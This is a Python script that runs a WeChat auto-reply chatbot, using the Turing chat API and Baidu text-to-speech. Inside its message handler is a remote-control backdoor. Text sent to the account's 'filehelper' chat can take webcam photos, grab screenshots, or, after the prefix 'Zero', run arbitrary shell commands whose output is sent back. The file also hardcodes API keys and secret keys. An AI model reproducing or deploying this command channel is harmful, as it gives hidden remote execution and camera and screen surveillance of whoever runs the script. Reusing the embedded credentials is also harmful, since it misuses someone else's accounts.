# -*- coding=utf-8 -*-
# Author: Zero
# Date: 2018 / 11 / 15
#---------------------------------------------------------------------------#
#Import Modules .
#---------------------------------------------------------------------------#
from pathlib import Path
import wave
from datetime import datetime
import pyaudio
import _thread
import time
import sys
import os
import requests
import argparse
from urllib import request
import json, base64, uuid
import pycurl
import io
import time
import aip
from aip import AipSpeech
import playsound
from playsound import playsound
import time
import itchat
import os
import cv2
try:
    from PIL import ImageGrab
except:
    os.system("pip install PILlow")
#=======================================================================#
#Options .
#=======================================================================#
bda_app_id = "11661012"
bda_api_key = "DsTWniZ4oaVcsTL2AMwulevZ"
bda_secret_key = "4M4eNyy1DncWrN7XrEAhfpyLFFnD6PjG"
bda_access_token = ""
bda_expires_in = ""
dump = ""
Turing_API_key = "d48c5b2b4a854d9dbc8db4cd675f1c26" 
Turing_API_address = "http://www.tuling123.com/openapi/api"
User_ID = "306894"
APP_ID = '11661012'
API_KEY = 'DsTWniZ4oaVcsTL2AMwulevZ'
SECRET_KEY = '4M4eNyy1DncWrN7XrEAhfpyLFFnD6PjG'
#---------------------------------------------------------------------------#
#Text To Music .
#---------------------------------------------------------------------------#
while 1:
    try:
        client = AipSpeech(APP_ID, API_KEY, SECRET_KEY)
    except:
        null = ""
    try:
        os.mkdir("lib")
    except:
        null = ""
#---------------------------------------------------------------------------#
#Import tuling API , TEXT Ret TEXT && Main Func .
#---------------------------------------------------------------------------#
    key = Turing_API_key
    location = "吴忠市"
    try:
        @itchat.msg_register(itchat.content.TEXT)
        def handler_receive_msg(msg): 
            global values
            values = str(time.time())
            message = msg['Text']
            Recv_User = str(msg['FromUserName'])
            toName = msg['ToUserName']
            result = itchat.search_friends(userName=str(msg['FromUserName']))
            From_User = result['NickName']
            path = 'temp.jpg'
            #print (message)
            if toName == "filehelper":
                if message == "capston":
                    cap = cv2.VideoCapture(0)
                    ret, img = cap.read()
                    cv2.imwrite("temp.jpg", img)
                    itchat.send('@img@%s' % u'temp.jpg', 'filehelper')
                    cap.release() 
                if message[0:4] == "Zero": 
                    recv = os.popen(message[4::]).read()
                    itchat.send(str(recv), "filehelper")
                if message == "screenshot": 
                    im = ImageGrab.grab() 
                    im.save(path, 'JPEG') 
                    itchat.send_image(path, 'filehelper')
            else:
                text = message
                r = requests.post(
                    Turing_API_address, 
                    json = {
                    "key": key,
                    "info": text, 
                    "loc": location, 
                    "userid":User_ID
                    })
                response = r.json()["text"]
                print (response)
                result  = client.synthesis(response, 'zh', 1, {
                    'cuid': 1008611,
                    'vol': 5,
                    'pit': 9,
                    'per': 4,
                    'spd': 6,
                    })
                if not isinstance(result, dict):
                    mp =  open("lib/" + values + ".mp3", 'wb')
                    mp.write(result)
                    mp.close()
                playsound("lib/" + values + ".mp3")
                itchat.send_file('lib/' + values + '.mp3',Recv_User)
                #itchat.send("From : " + From_User + " Msg : " + message, Recv_User)
                itchat.send("From : " + From_User + " Msg : " + message, 'filehelper')
                os.remove("lib/" + values + ".mp3")

        if __name__ == '__main__':
                itchat.auto_login(enableCmdQR=0.5,hotReload=True)
                itchat.send('Remote Client Connected !', "filehelper")
                itchat.run()
    except:
        null = ""